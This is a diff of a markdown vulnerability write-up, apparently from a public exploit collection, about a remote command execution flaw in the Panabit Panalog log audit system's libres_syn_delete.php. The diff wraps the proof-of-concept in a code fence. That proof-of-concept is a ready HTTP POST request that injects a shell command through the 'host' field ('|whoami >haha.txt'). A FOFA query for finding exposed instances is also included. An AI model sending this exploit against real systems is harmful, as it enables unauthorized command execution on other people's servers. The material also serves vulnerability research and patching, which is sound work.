@@ -69,6 +69,7 @@ FOFA：app="Panabit-Panalog"
 
 POC/EXP：
 
+```http
 POST /content-apply/libres_syn_delete.php HTTP/1.1
 Host: 127.0.0.1:4432
 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
@@ -79,6 +80,8 @@ Connection: close
 Content-Type: application/x-www-form-urlencoded
 
 token=1&id=2&host=|whoami >haha.txt
+```
+
 
 ![image-20240219174048112](./.resource/Panalog日志审计系统libres_syn_delete.phpRCE漏洞/media/image-20240219174048112.png)
 
